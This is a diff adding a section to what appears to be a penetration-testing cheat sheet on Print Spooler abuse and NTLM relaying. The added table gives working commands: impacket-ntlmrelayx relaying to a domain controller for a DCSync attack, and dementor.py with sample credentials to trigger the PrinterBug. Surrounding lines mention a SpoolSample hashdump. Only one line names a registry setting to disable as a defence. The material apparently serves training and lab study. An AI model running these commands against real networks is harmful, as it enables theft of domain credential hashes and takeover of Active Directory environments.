@@ -29,3 +29,12 @@
 #### 3) Perform a hashdump if no command is specified (SpoolSample Exploit)
 
 ## THIS ATTACK CAN BE UNSTABLE SO USE IT WITH CAUTION!
+
+# Print Spooler & NTLM Relaying
+
+| Command                                                      | Description                                                  |
+| ------------------------------------------------------------ | ------------------------------------------------------------ |
+| `impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support`   | Used to forward any connections to DC2 and attempt to perform DCsync attack |
+| `python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123` | Used to trigger the PrinterBug |
+| `RegisterSpoolerRemoteRpcEndPoint`                           | Registry key that can be disabled to prevent the PrinterBug |
+
